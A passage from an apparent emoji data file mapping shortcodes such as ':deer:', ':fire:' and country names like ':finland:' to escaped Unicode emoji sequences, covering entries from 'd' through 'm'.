\":deaf_person:\": \"\ud83e\uddcf\",\n    \":deaf_woman:\": \"\ud83e\uddcf\u200d\u2640\",\n    \":deciduous_tree:\": \"\ud83c\udf33\",\n    \":deer:\": \"\ud83e\udd8c\",\n    \":denmark:\": \"\ud83c\udde9\u200d\ud83c\uddf0\",\n    \":department_store:\": \"\ud83c\udfec\",\n    \":derelict_house:\": \"\ud83c\udfda\",\n    \":desert:\": \"\ud83c\udfdc\",\n    \":desert_island:\": \"\ud83c\udfdd\",\n    \":desktop_computer:\": \"\ud83d\udda5\",\n    \":detective:\": \"\ud83d\udd75\",\n    \":diamond_shape_with_a_dot_inside:\": \"\ud83d\udca0\",\n    \":diamonds:\": \"\u2666\",\n    \":diego_garcia:\": \"\ud83c\udde9\u200d\ud83c\uddec\",\n    \":disappointed:\": \"\ud83d\ude1e\",\n    \":disappointed_relieved:\": \"\ud83d\ude25\",\n    \":diving_mask:\": \"\ud83e\udd3f\",\n    \":diya_lamp:\": \"\ud83e\ude94\",\n    \":dizzy:\": \"\ud83d\udcab\",\n    \":dizzy_face:\": \"\ud83d\ude35\",\n    \":djibouti:\": \"\ud83c\udde9\u200d\ud83c\uddef\",\n    \":dna:\": \"\ud83e\uddec\",\n    \":do_not_litter:\": \"\ud83d\udeaf\",\n    \":dog:\": \"\ud83d\udc36\",\n    \":dog2:\": \"\ud83d\udc15\",\n    \":dollar:\": \"\ud83d\udcb5\",\n    \":dolls:\": \"\ud83c\udf8e\",\n    \":dolphin:\": \"\ud83d\udc2c\",\n    \":dominica:\": \"\ud83c\udde9\u200d\ud83c\uddf2\",\n    \":dominican_republic:\": \"\ud83c\udde9\u200d\ud83c\uddf4\",\n    \":door:\": \"\ud83d\udeaa\",\n    \":doughnut:\": \"\ud83c\udf69\",\n    \":dove:\": \"\ud83d\udd4a\",\n    \":dragon:\": \"\ud83d\udc09\",\n    \":dragon_face:\": \"\ud83d\udc32\",\n    \":dress:\": \"\ud83d\udc57\",\n    \":dromedary_camel:\": \"\ud83d\udc2a\",\n    \":drooling_face:\": \"\ud83e\udd24\",\n    \":drop_of_blood:\": \"\ud83e\ude78\",\n    \":droplet:\": \"\ud83d\udca7\",\n    \":drum:\": \"\ud83e\udd41\",\n    \":duck:\": \"\ud83e\udd86\",\n    \":dumpling:\": \"\ud83e\udd5f\",\n    \":dvd:\": \"\ud83d\udcc0\",\n    \":e-mail:\": \"\ud83d\udce7\",\n    \":eagle:\": \"\ud83e\udd85\",\n    \":ear:\": \"\ud83d\udc42\",\n    \":ear_of_rice:\": \"\ud83c\udf3e\",\n    \":ear_with_hearing_aid:\": \"\ud83e\uddbb\",\n    \":earth_africa:\": \"\ud83c\udf0d\",\n    \":earth_americas:\": \"\ud83c\udf0e\",\n    \":earth_asia:\": \"\ud83c\udf0f\",\n    \":ecuador:\": \"\ud83c\uddea\u200d\ud83c\udde8\",\n    \":egg:\": \"\ud83e\udd5a\",\n    \":eggplant:\": \"\ud83c\udf46\",\n    \":egypt:\": \"\ud83c\uddea\u200d\ud83c\uddec\",\n    \":eight:\": \"8\u200d\u20e3\",\n    \":eight_pointed_black_star:\": \"\u2734\",\n    \":eight_spoked_asterisk:\": \"\u2733\",\n    \":eject_button:\": \"\u23cf\",\n    \":el_salvador:\": \"\ud83c\uddf8\u200d\ud83c\uddfb\",\n    \":electric_plug:\": \"\ud83d\udd0c\",\n    \":elephant:\": \"\ud83d\udc18\",\n    \":elf:\": \"\ud83e\udddd\",\n    \":elf_man:\": \"\ud83e\udddd\u200d\u2642\",\n    \":elf_woman:\": \"\ud83e\udddd\u200d\u2640\",\n    \":email:\": \"\u2709\",\n    \":end:\": \"\ud83d\udd1a\",\n    \":england:\": \"\ud83c\udff4\u200d\udb40\udc67\u200d\udb40\udc62\u200d\udb40\udc65\u200d\udb40\udc6e\u200d\udb40\udc67\u200d\udb40\udc7f\",\n    \":envelope:\": \"\u2709\",\n    \":envelope_with_arrow:\": \"\ud83d\udce9\",\n    \":equatorial_guinea:\": \"\ud83c\uddec\u200d\ud83c\uddf6\",\n    \":eritrea:\": \"\ud83c\uddea\u200d\ud83c\uddf7\",\n    \":es:\": \"\ud83c\uddea\u200d\ud83c\uddf8\",\n    \":estonia:\": \"\ud83c\uddea\u200d\ud83c\uddea\",\n    \":ethiopia:\": \"\ud83c\uddea\u200d\ud83c\uddf9\",\n    \":eu:\": \"\ud83c\uddea\u200d\ud83c\uddfa\",\n    \":euro:\": \"\ud83d\udcb6\",\n    \":european_castle:\": \"\ud83c\udff0\",\n    \":european_post_office:\": \"\ud83c\udfe4\",\n    \":european_union:\": \"\ud83c\uddea\u200d\ud83c\uddfa\",\n    \":evergreen_tree:\": \"\ud83c\udf32\",\n    \":exclamation:\": \"\u2757\",\n    \":exploding_head:\": \"\ud83e\udd2f\",\n    \":expressionless:\": \"\ud83d\ude11\",\n    \":eye:\": \"\ud83d\udc41\",\n    \":eye_speech_bubble:\": \"\ud83d\udc41\u200d\ud83d\udde8\",\n    \":eyeglasses:\": \"\ud83d\udc53\",\n    \":eyes:\": \"\ud83d\udc40\",\n    \":face_with_head_bandage:\": \"\ud83e\udd15\",\n    \":face_with_thermometer:\": \"\ud83e\udd12\",\n    \":facepalm:\": \"\ud83e\udd26\",\n    \":facepunch:\": \"\ud83d\udc4a\",\n    \":factory:\": \"\ud83c\udfed\",\n    \":factory_worker:\": \"\ud83e\uddd1\u200d\ud83c\udfed\",\n    \":fairy:\": \"\ud83e\uddda\",\n    \":fairy_man:\": \"\ud83e\uddda\u200d\u2642\",\n    \":fairy_woman:\": \"\ud83e\uddda\u200d\u2640\",\n    \":falafel:\": \"\ud83e\uddc6\",\n    \":falkland_islands:\": \"\ud83c\uddeb\u200d\ud83c\uddf0\",\n    \":fallen_leaf:\": \"\ud83c\udf42\",\n    \":family:\": \"\ud83d\udc6a\",\n    \":family_man_boy:\": \"\ud83d\udc68\u200d\ud83d\udc66\",\n    \":family_man_boy_boy:\": \"\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\",\n    \":family_man_girl:\": \"\ud83d\udc68\u200d\ud83d\udc67\",\n    \":family_man_girl_boy:\": \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\",\n    \":family_man_girl_girl:\": \"\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\",\n    \":family_man_man_boy:\": \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\",\n    \":family_man_man_boy_boy:\": \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66\",\n    \":family_man_man_girl:\": \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\",\n    \":family_man_man_girl_boy:\": \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66\",\n    \":family_man_man_girl_girl:\": \"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67\",\n    \":family_man_woman_boy:\": \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\",\n    \":family_man_woman_boy_boy:\": \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\",\n    \":family_man_woman_girl:\": \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\",\n    \":family_man_woman_girl_boy:\": \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\",\n    \":family_man_woman_girl_girl:\": \"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\",\n    \":family_woman_boy:\": \"\ud83d\udc69\u200d\ud83d\udc66\",\n    \":family_woman_boy_boy:\": \"\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\",\n    \":family_woman_girl:\": \"\ud83d\udc69\u200d\ud83d\udc67\",\n    \":family_woman_girl_boy:\": \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\",\n    \":family_woman_girl_girl:\": \"\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\",\n    \":family_woman_woman_boy:\": \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\",\n    \":family_woman_woman_boy_boy:\": \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66\",\n    \":family_woman_woman_girl:\": \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\",\n    \":family_woman_woman_girl_boy:\": \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66\",\n    \":family_woman_woman_girl_girl:\": \"\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67\",\n    \":farmer:\": \"\ud83e\uddd1\u200d\ud83c\udf3e\",\n    \":faroe_islands:\": \"\ud83c\uddeb\u200d\ud83c\uddf4\",\n    \":fast_forward:\": \"\u23e9\",\n    \":fax:\": \"\ud83d\udce0\",\n    \":fearful:\": \"\ud83d\ude28\",\n    \":feet:\": \"\ud83d\udc3e\",\n    \":female_detective:\": \"\ud83d\udd75\u200d\u2640\",\n    \":female_sign:\": \"\u2640\",\n    \":ferris_wheel:\": \"\ud83c\udfa1\",\n    \":ferry:\": \"\u26f4\",\n    \":field_hockey:\": \"\ud83c\udfd1\",\n    \":fiji:\": \"\ud83c\uddeb\u200d\ud83c\uddef\",\n    \":file_cabinet:\": \"\ud83d\uddc4\",\n    \":file_folder:\": \"\ud83d\udcc1\",\n    \":film_projector:\": \"\ud83d\udcfd\",\n    \":film_strip:\": \"\ud83c\udf9e\",\n    \":finland:\": \"\ud83c\uddeb\u200d\ud83c\uddee\",\n    \":fire:\": \"\ud83d\udd25\",\n    \":fire_engine:\": \"\ud83d\ude92\",\n    \":fire_extinguisher:\": \"\ud83e\uddef\",\n    \":firecracker:\": \"\ud83e\udde8\",\n    \":firefighter:\": \"\ud83e\uddd1\u200d\ud83d\ude92\",\n    \":fireworks:\": \"\ud83c\udf86\",\n    \":first_quarter_moon:\": \"\ud83c\udf13\",\n    \":first_quarter_moon_with_face:\": \"\ud83c\udf1b\",\n    \":fish:\": \"\ud83d\udc1f\",\n    \":fish_cake:\": \"\ud83c\udf65\",\n    \":fishing_pole_and_fish:\": \"\ud83c\udfa3\",\n    \":fist:\": \"\u270a\",\n    \":fist_left:\": \"\ud83e\udd1b\",\n    \":fist_oncoming:\": \"\ud83d\udc4a\",\n    \":fist_raised:\": \"\u270a\",\n    \":fist_right:\": \"\ud83e\udd1c\",\n    \":five:\": \"5\u200d\u20e3\",\n    \":flags:\": \"\ud83c\udf8f\",\n    \":flamingo:\": \"\ud83e\udda9\",\n    \":flashlight:\": \"\ud83d\udd26\",\n    \":flat_shoe:\": \"\ud83e\udd7f\",\n    \":fleur_de_lis:\": \"\u269c\",\n    \":flight_arrival:\": \"\ud83d\udeec\",\n    \":flight_departure:\": \"\ud83d\udeeb\",\n    \":flipper:\": \"\ud83d\udc2c\",\n    \":floppy_disk:\": \"\ud83d\udcbe\",\n    \":flower_playing_cards:\": \"\ud83c\udfb4\",\n    \":flushed:\": \"\ud83d\ude33\",\n    \":flying_disc:\": \"\ud83e\udd4f\",\n    \":flying_saucer:\": \"\ud83d\udef8\",\n    \":fog:\": \"\ud83c\udf2b\",\n    \":foggy:\": \"\ud83c\udf01\",\n    \":foot:\": \"\ud83e\uddb6\",\n    \":football:\": \"\ud83c\udfc8\",\n    \":footprints:\": \"\ud83d\udc63\",\n    \":fork_and_knife:\": \"\ud83c\udf74\",\n    \":fortune_cookie:\": \"\ud83e\udd60\",\n    \":fountain:\": \"\u26f2\",\n    \":fountain_pen:\": \"\ud83d\udd8b\",\n    \":four:\": \"4\u200d\u20e3\",\n    \":four_leaf_clover:\": \"\ud83c\udf40\",\n    \":fox_face:\": \"\ud83e\udd8a\",\n    \":fr:\": \"\ud83c\uddeb\u200d\ud83c\uddf7\",\n    \":framed_picture:\": \"\ud83d\uddbc\",\n    \":free:\": \"\ud83c\udd93\",\n    \":french_guiana:\": \"\ud83c\uddec\u200d\ud83c\uddeb\",\n    \":french_polynesia:\": \"\ud83c\uddf5\u200d\ud83c\uddeb\",\n    \":french_southern_territories:\": \"\ud83c\uddf9\u200d\ud83c\uddeb\",\n    \":fried_egg:\": \"\ud83c\udf73\",\n    \":fried_shrimp:\": \"\ud83c\udf64\",\n    \":fries:\": \"\ud83c\udf5f\",\n    \":frog:\": \"\ud83d\udc38\",\n    \":frowning:\": \"\ud83d\ude26\",\n    \":frowning_face:\": \"\u2639\",\n    \":frowning_man:\": \"\ud83d\ude4d\u200d\u2642\",\n    \":frowning_person:\": \"\ud83d\ude4d\",\n    \":frowning_woman:\": \"\ud83d\ude4d\u200d\u2640\",\n    \":fu:\": \"\ud83d\udd95\",\n    \":fuelpump:\": \"\u26fd\",\n    \":full_moon:\": \"\ud83c\udf15\",\n    \":full_moon_with_face:\": \"\ud83c\udf1d\",\n    \":funeral_urn:\": \"\u26b1\",\n    \":gabon:\": \"\ud83c\uddec\u200d\ud83c\udde6\",\n    \":gambia:\": \"\ud83c\uddec\u200d\ud83c\uddf2\",\n    \":game_die:\": \"\ud83c\udfb2\",\n    \":garlic:\": \"\ud83e\uddc4\",\n    \":gb:\": \"\ud83c\uddec\u200d\ud83c\udde7\",\n    \":gear:\": \"\u2699\",\n    \":gem:\": \"\ud83d\udc8e\",\n    \":gemini:\": \"\u264a\",\n    \":genie:\": \"\ud83e\uddde\",\n    \":genie_man:\": \"\ud83e\uddde\u200d\u2642\",\n    \":genie_woman:\": \"\ud83e\uddde\u200d\u2640\",\n    \":georgia:\": \"\ud83c\uddec\u200d\ud83c\uddea\",\n    \":ghana:\": \"\ud83c\uddec\u200d\ud83c\udded\",\n    \":ghost:\": \"\ud83d\udc7b\",\n    \":gibraltar:\": \"\ud83c\uddec\u200d\ud83c\uddee\",\n    \":gift:\": \"\ud83c\udf81\",\n    \":gift_heart:\": \"\ud83d\udc9d\",\n    \":giraffe:\": \"\ud83e\udd92\",\n    \":girl:\": \"\ud83d\udc67\",\n    \":globe_with_meridians:\": \"\ud83c\udf10\",\n    \":gloves:\": \"\ud83e\udde4\",\n    \":goal_net:\": \"\ud83e\udd45\",\n    \":goat:\": \"\ud83d\udc10\",\n    \":goggles:\": \"\ud83e\udd7d\",\n    \":golf:\": \"\u26f3\",\n    \":golfing:\": \"\ud83c\udfcc\",\n    \":golfing_man:\": \"\ud83c\udfcc\u200d\u2642\",\n    \":golfing_woman:\": \"\ud83c\udfcc\u200d\u2640\",\n    \":gorilla:\": \"\ud83e\udd8d\",\n    \":grapes:\": \"\ud83c\udf47\",\n    \":greece:\": \"\ud83c\uddec\u200d\ud83c\uddf7\",\n    \":green_apple:\": \"\ud83c\udf4f\",\n    \":green_book:\": \"\ud83d\udcd7\",\n    \":green_circle:\": \"\ud83d\udfe2\",\n    \":green_heart:\": \"\ud83d\udc9a\",\n    \":green_salad:\": \"\ud83e\udd57\",\n    \":green_square:\": \"\ud83d\udfe9\",\n    \":greenland:\": \"\ud83c\uddec\u200d\ud83c\uddf1\",\n    \":grenada:\": \"\ud83c\uddec\u200d\ud83c\udde9\",\n    \":grey_exclamation:\": \"\u2755\",\n    \":grey_question:\": \"\u2754\",\n    \":grimacing:\": \"\ud83d\ude2c\",\n    \":grin:\": \"\ud83d\ude01\",\n    \":grinning:\": \"\ud83d\ude00\",\n    \":guadeloupe:\": \"\ud83c\uddec\u200d\ud83c\uddf5\",\n    \":guam:\": \"\ud83c\uddec\u200d\ud83c\uddfa\",\n    \":guard:\": \"\ud83d\udc82\",\n    \":guardsman:\": \"\ud83d\udc82\u200d\u2642\",\n    \":guardswoman:\": \"\ud83d\udc82\u200d\u2640\",\n    \":guatemala:\": \"\ud83c\uddec\u200d\ud83c\uddf9\",\n    \":guernsey:\": \"\ud83c\uddec\u200d\ud83c\uddec\",\n    \":guide_dog:\": \"\ud83e\uddae\",\n    \":guinea:\": \"\ud83c\uddec\u200d\ud83c\uddf3\",\n    \":guinea_bissau:\": \"\ud83c\uddec\u200d\ud83c\uddfc\",\n    \":guitar:\": \"\ud83c\udfb8\",\n    \":gun:\": \"\ud83d\udd2b\",\n    \":guyana:\": \"\ud83c\uddec\u200d\ud83c\uddfe\",\n    \":haircut:\": \"\ud83d\udc87\",\n    \":haircut_man:\": \"\ud83d\udc87\u200d\u2642\",\n    \":haircut_woman:\": \"\ud83d\udc87\u200d\u2640\",\n    \":haiti:\": \"\ud83c\udded\u200d\ud83c\uddf9\",\n    \":hamburger:\": \"\ud83c\udf54\",\n    \":hammer:\": \"\ud83d\udd28\",\n    \":hammer_and_pick:\": \"\u2692\",\n    \":hammer_and_wrench:\": \"\ud83d\udee0\",\n    \":hamster:\": \"\ud83d\udc39\",\n    \":hand:\": \"\u270b\",\n    \":hand_over_mouth:\": \"\ud83e\udd2d\",\n    \":handbag:\": \"\ud83d\udc5c\",\n    \":handball_person:\": \"\ud83e\udd3e\",\n    \":handshake:\": \"\ud83e\udd1d\",\n    \":hankey:\": \"\ud83d\udca9\",\n    \":hash:\": \"#\u200d\u20e3\",\n    \":hatched_chick:\": \"\ud83d\udc25\",\n    \":hatching_chick:\": \"\ud83d\udc23\",\n    \":headphones:\": \"\ud83c\udfa7\",\n    \":health_worker:\": \"\ud83e\uddd1\u200d\u2695\",\n    \":hear_no_evil:\": \"\ud83d\ude49\",\n    \":heard_mcdonald_islands:\": \"\ud83c\udded\u200d\ud83c\uddf2\",\n    \":heart:\": \"\u2764\",\n    \":heart_decoration:\": \"\ud83d\udc9f\",\n    \":heart_eyes:\": \"\ud83d\ude0d\",\n    \":heart_eyes_cat:\": \"\ud83d\ude3b\",\n    \":heartbeat:\": \"\ud83d\udc93\",\n    \":heartpulse:\": \"\ud83d\udc97\",\n    \":hearts:\": \"\u2665\",\n    \":heavy_check_mark:\": \"\u2714\",\n    \":heavy_division_sign:\": \"\u2797\",\n    \":heavy_dollar_sign:\": \"\ud83d\udcb2\",\n    \":heavy_exclamation_mark:\": \"\u2757\",\n    \":heavy_heart_exclamation:\": \"\u2763\",\n    \":heavy_minus_sign:\": \"\u2796\",\n    \":heavy_multiplication_x:\": \"\u2716\",\n    \":heavy_plus_sign:\": \"\u2795\",\n    \":hedgehog:\": \"\ud83e\udd94\",\n    \":helicopter:\": \"\ud83d\ude81\",\n    \":herb:\": \"\ud83c\udf3f\",\n    \":hibiscus:\": \"\ud83c\udf3a\",\n    \":high_brightness:\": \"\ud83d\udd06\",\n    \":high_heel:\": \"\ud83d\udc60\",\n    \":hiking_boot:\": \"\ud83e\udd7e\",\n    \":hindu_temple:\": \"\ud83d\uded5\",\n    \":hippopotamus:\": \"\ud83e\udd9b\",\n    \":hocho:\": \"\ud83d\udd2a\",\n    \":hole:\": \"\ud83d\udd73\",\n    \":honduras:\": \"\ud83c\udded\u200d\ud83c\uddf3\",\n    \":honey_pot:\": \"\ud83c\udf6f\",\n    \":honeybee:\": \"\ud83d\udc1d\",\n    \":hong_kong:\": \"\ud83c\udded\u200d\ud83c\uddf0\",\n    \":horse:\": \"\ud83d\udc34\",\n    \":horse_racing:\": \"\ud83c\udfc7\",\n    \":hospital:\": \"\ud83c\udfe5\",\n    \":hot_face:\": \"\ud83e\udd75\",\n    \":hot_pepper:\": \"\ud83c\udf36\",\n    \":hotdog:\": \"\ud83c\udf2d\",\n    \":hotel:\": \"\ud83c\udfe8\",\n    \":hotsprings:\": \"\u2668\",\n    \":hourglass:\": \"\u231b\",\n    \":hourglass_flowing_sand:\": \"\u23f3\",\n    \":house:\": \"\ud83c\udfe0\",\n    \":house_with_garden:\": \"\ud83c\udfe1\",\n    \":houses:\": \"\ud83c\udfd8\",\n    \":hugs:\": \"\ud83e\udd17\",\n    \":hungary:\": \"\ud83c\udded\u200d\ud83c\uddfa\",\n    \":hushed:\": \"\ud83d\ude2f\",\n    \":ice_cream:\": \"\ud83c\udf68\",\n    \":ice_cube:\": \"\ud83e\uddca\",\n    \":ice_hockey:\": \"\ud83c\udfd2\",\n    \":ice_skate:\": \"\u26f8\",\n    \":icecream:\": \"\ud83c\udf66\",\n    \":iceland:\": \"\ud83c\uddee\u200d\ud83c\uddf8\",\n    \":id:\": \"\ud83c\udd94\",\n    \":ideograph_advantage:\": \"\ud83c\ude50\",\n    \":imp:\": \"\ud83d\udc7f\",\n    \":inbox_tray:\": \"\ud83d\udce5\",\n    \":incoming_envelope:\": \"\ud83d\udce8\",\n    \":india:\": \"\ud83c\uddee\u200d\ud83c\uddf3\",\n    \":indonesia:\": \"\ud83c\uddee\u200d\ud83c\udde9\",\n    \":infinity:\": \"\u267e\",\n    \":information_desk_person:\": \"\ud83d\udc81\",\n    \":information_source:\": \"\u2139\",\n    \":innocent:\": \"\ud83d\ude07\",\n    \":interrobang:\": \"\u2049\",\n    \":iphone:\": \"\ud83d\udcf1\",\n    \":iran:\": \"\ud83c\uddee\u200d\ud83c\uddf7\",\n    \":iraq:\": \"\ud83c\uddee\u200d\ud83c\uddf6\",\n    \":ireland:\": \"\ud83c\uddee\u200d\ud83c\uddea\",\n    \":isle_of_man:\": \"\ud83c\uddee\u200d\ud83c\uddf2\",\n    \":israel:\": \"\ud83c\uddee\u200d\ud83c\uddf1\",\n    \":it:\": \"\ud83c\uddee\u200d\ud83c\uddf9\",\n    \":izakaya_lantern:\": \"\ud83c\udfee\",\n    \":jack_o_lantern:\": \"\ud83c\udf83\",\n    \":jamaica:\": \"\ud83c\uddef\u200d\ud83c\uddf2\",\n    \":japan:\": \"\ud83d\uddfe\",\n    \":japanese_castle:\": \"\ud83c\udfef\",\n    \":japanese_goblin:\": \"\ud83d\udc7a\",\n    \":japanese_ogre:\": \"\ud83d\udc79\",\n    \":jeans:\": \"\ud83d\udc56\",\n    \":jersey:\": \"\ud83c\uddef\u200d\ud83c\uddea\",\n    \":jigsaw:\": \"\ud83e\udde9\",\n    \":jordan:\": \"\ud83c\uddef\u200d\ud83c\uddf4\",\n    \":joy:\": \"\ud83d\ude02\",\n    \":joy_cat:\": \"\ud83d\ude39\",\n    \":joystick:\": \"\ud83d\udd79\",\n    \":jp:\": \"\ud83c\uddef\u200d\ud83c\uddf5\",\n    \":judge:\": \"\ud83e\uddd1\u200d\u2696\",\n    \":juggling_person:\": \"\ud83e\udd39\",\n    \":kaaba:\": \"\ud83d\udd4b\",\n    \":kangaroo:\": \"\ud83e\udd98\",\n    \":kazakhstan:\": \"\ud83c\uddf0\u200d\ud83c\uddff\",\n    \":kenya:\": \"\ud83c\uddf0\u200d\ud83c\uddea\",\n    \":key:\": \"\ud83d\udd11\",\n    \":keyboard:\": \"\u2328\",\n    \":keycap_ten:\": \"\ud83d\udd1f\",\n    \":kick_scooter:\": \"\ud83d\udef4\",\n    \":kimono:\": \"\ud83d\udc58\",\n    \":kiribati:\": \"\ud83c\uddf0\u200d\ud83c\uddee\",\n    \":kiss:\": \"\ud83d\udc8b\",\n    \":kissing:\": \"\ud83d\ude17\",\n    \":kissing_cat:\": \"\ud83d\ude3d\",\n    \":kissing_closed_eyes:\": \"\ud83d\ude1a\",\n    \":kissing_heart:\": \"\ud83d\ude18\",\n    \":kissing_smiling_eyes:\": \"\ud83d\ude19\",\n    \":kite:\": \"\ud83e\ude81\",\n    \":kiwi_fruit:\": \"\ud83e\udd5d\",\n    \":kneeling_man:\": \"\ud83e\uddce\u200d\u2642\",\n    \":kneeling_person:\": \"\ud83e\uddce\",\n    \":kneeling_woman:\": \"\ud83e\uddce\u200d\u2640\",\n    \":knife:\": \"\ud83d\udd2a\",\n    \":koala:\": \"\ud83d\udc28\",\n    \":koko:\": \"\ud83c\ude01\",\n    \":kosovo:\": \"\ud83c\uddfd\u200d\ud83c\uddf0\",\n    \":kr:\": \"\ud83c\uddf0\u200d\ud83c\uddf7\",\n    \":kuwait:\": \"\ud83c\uddf0\u200d\ud83c\uddfc\",\n    \":kyrgyzstan:\": \"\ud83c\uddf0\u200d\ud83c\uddec\",\n    \":lab_coat:\": \"\ud83e\udd7c\",\n    \":label:\": \"\ud83c\udff7\",\n    \":lacrosse:\": \"\ud83e\udd4d\",\n    \":lantern:\": \"\ud83c\udfee\",\n    \":laos:\": \"\ud83c\uddf1\u200d\ud83c\udde6\",\n    \":large_blue_circle:\": \"\ud83d\udd35\",\n    \":large_blue_diamond:\": \"\ud83d\udd37\",\n    \":large_orange_diamond:\": \"\ud83d\udd36\",\n    \":last_quarter_moon:\": \"\ud83c\udf17\",\n    \":last_quarter_moon_with_face:\": \"\ud83c\udf1c\",\n    \":latin_cross:\": \"\u271d\",\n    \":latvia:\": \"\ud83c\uddf1\u200d\ud83c\uddfb\",\n    \":laughing:\": \"\ud83d\ude06\",\n    \":leafy_green:\": \"\ud83e\udd6c\",\n    \":leaves:\": \"\ud83c\udf43\",\n    \":lebanon:\": \"\ud83c\uddf1\u200d\ud83c\udde7\",\n    \":ledger:\": \"\ud83d\udcd2\",\n    \":left_luggage:\": \"\ud83d\udec5\",\n    \":left_right_arrow:\": \"\u2194\",\n    \":left_speech_bubble:\": \"\ud83d\udde8\",\n    \":leftwards_arrow_with_hook:\": \"\u21a9\",\n    \":leg:\": \"\ud83e\uddb5\",\n    \":lemon:\": \"\ud83c\udf4b\",\n    \":leo:\": \"\u264c\",\n    \":leopard:\": \"\ud83d\udc06\",\n    \":lesotho:\": \"\ud83c\uddf1\u200d\ud83c\uddf8\",\n    \":level_slider:\": \"\ud83c\udf9a\",\n    \":liberia:\": \"\ud83c\uddf1\u200d\ud83c\uddf7\",\n    \":libra:\": \"\u264e\",\n    \":libya:\": \"\ud83c\uddf1\u200d\ud83c\uddfe\",\n    \":liechtenstein:\": \"\ud83c\uddf1\u200d\ud83c\uddee\",\n    \":light_rail:\": \"\ud83d\ude88\",\n    \":link:\": \"\ud83d\udd17\",\n    \":lion:\": \"\ud83e\udd81\",\n    \":lips:\": \"\ud83d\udc44\",\n    \":lipstick:\": \"\ud83d\udc84\",\n    \":lithuania:\": \"\ud83c\uddf1\u200d\ud83c\uddf9\",\n    \":lizard:\": \"\ud83e\udd8e\",\n    \":llama:\": \"\ud83e\udd99\",\n    \":lobster:\": \"\ud83e\udd9e\",\n    \":lock:\": \"\ud83d\udd12\",\n    \":lock_with_ink_pen:\": \"\ud83d\udd0f\",\n    \":lollipop:\": \"\ud83c\udf6d\",\n    \":loop:\": \"\u27bf\",\n    \":lotion_bottle:\": \"\ud83e\uddf4\",\n    \":lotus_position:\": \"\ud83e\uddd8\",\n    \":lotus_position_man:\": \"\ud83e\uddd8\u200d\u2642\",\n    \":lotus_position_woman:\": \"\ud83e\uddd8\u200d\u2640\",\n    \":loud_sound:\": \"\ud83d\udd0a\",\n    \":loudspeaker:\": \"\ud83d\udce2\",\n    \":love_hotel:\": \"\ud83c\udfe9\",\n    \":love_letter:\": \"\ud83d\udc8c\",\n    \":love_you_gesture:\": \"\ud83e\udd1f\",\n    \":low_brightness:\": \"\ud83d\udd05\",\n    \":luggage:\": \"\ud83e\uddf3\",\n    \":luxembourg:\": \"\ud83c\uddf1\u200d\ud83c\uddfa\",\n    \":lying_face:\": \"\ud83e\udd25\",\n    \":m:\": \"\u24c2\",\n    \":macau:\": \"\ud83c\uddf2\u200d\ud83c\uddf4\",\n    \":macedonia:\": \"\ud83c\uddf2\u200d\ud83c\uddf0\",\n    \":madagascar:\": \"\ud83c\uddf2\u200d\ud83c\uddec\",\n    \":mag:\": \"\ud83d\udd0d\",\n    \":mag_right:\": \"\ud83d\udd0e\",\n    \":mage:\": \"\ud83e\uddd9\",\n    \":mage_man:\": \"\ud83e\uddd9\u200d\u2642\",\n    \":mage_woman:\": \"\ud83e\uddd9\u200d\u2640\",\n    \":magnet:\": \"\ud83e\uddf2\",\n    \":mahjong:\": \"\ud83c\udc04\",\n    \":mailbox:\": \"\ud83d\udceb\",\n    \":mailbox_closed:\": \"\ud83d\udcea\",\n    \":mailbox_with_mail:\": \"\ud83d\udcec\",\n    \":mailbox_with_no_mail:\": \"\ud83d\udced\",\n    \":malawi:\": \"\ud83c\uddf2\u200d\ud83c\uddfc\",\n    \":malaysia:\": \"\ud83c\uddf2\u200d\ud83c\uddfe\",\n    \":maldives:\": \"\ud83c\uddf2\u200d\ud83c\uddfb\",\n    \":male_detective:\": \"\ud83d\udd75\u200d\u2642\",\n    \":male_sign:\": \"\u2642\",\n    \":mali:\": \"\ud83c\uddf2\u200d\ud83c\uddf1\",\n    \":malta:\": \"\ud83c\uddf2\u200d\ud83c\uddf9\",\n    \":man:\": \"\ud83d\udc68\",\n    \":man_artist:\": \"\ud83d\udc68\u200d\ud83c\udfa8\",\n    \":man_astronaut:\": \"\ud83d\udc68\u200d\ud83d\ude80\",\n    \":man_cartwheeling:\": \"\ud83e\udd38\u200d\u2642\",\n    \":man_cook:\": \"\ud83d\udc68\u200d\ud83c\udf73\",\n    \":man_dancing:\": \"\ud83d\udd7a\",\n    \":man_facepalming:\": \"\ud83e\udd26\u200d\u2642\",\n    \":man_factory_worker:\": \"\ud83d\udc68\u200d\ud83c\udfed\",\n    \":man_farmer:\": \"\ud83d\udc68\u200d\ud83c\udf3e\",\n    \":man_firefighter:\": \"\ud83d\udc68\u200d\ud83d\ude92\",\n    \":man_health_worker:\": \"\ud83d\udc68\u200d\u2695\",\n    \":man_in_manual_wheelchair:\": \"\ud83d\udc68\u200d\ud83e\uddbd\",\n    \":man_in_motorized_wheelchair:\": \"\ud83d\udc68\u200d\ud83e\uddbc\",\n    \":man_in_tuxedo:\": \"\ud83e\udd35\",\n    \":man_judge:\": \"\ud83d\udc68\u200d\u2696\",\n    \":man_juggling:\": 